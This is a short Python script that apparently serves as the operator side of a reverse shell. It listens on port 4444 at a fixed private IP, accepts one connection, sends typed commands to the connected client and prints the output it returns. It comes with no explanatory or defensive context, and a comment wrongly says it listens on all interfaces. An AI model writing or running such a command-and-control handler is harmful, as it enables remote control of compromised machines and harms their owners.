import socket

# Define the IP address and port number to listen on
HOST = '192.168.224.66'  # Listen on all available interfaces
PORT = 4444  # Replace with the desired port number

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"Listening on {HOST}:{PORT}")

    conn, addr = s.accept()
    print(f"Connection from {addr}")

    while True:
        # Prompt user for command input
        command = input("Enter command: ")

        # Send the command to the client
        conn.send(command.encode('utf-8'))

        # If 'exit' command is sent, break the loop
        if command.lower() == 'exit':
            break

        # Receive and print the result from the client
        result = conn.recv(4096).decode('utf-8')
        print(result)

    # Close the connection
    conn.close()
    s.close()

if __name__ == '__main__':
    start_server()
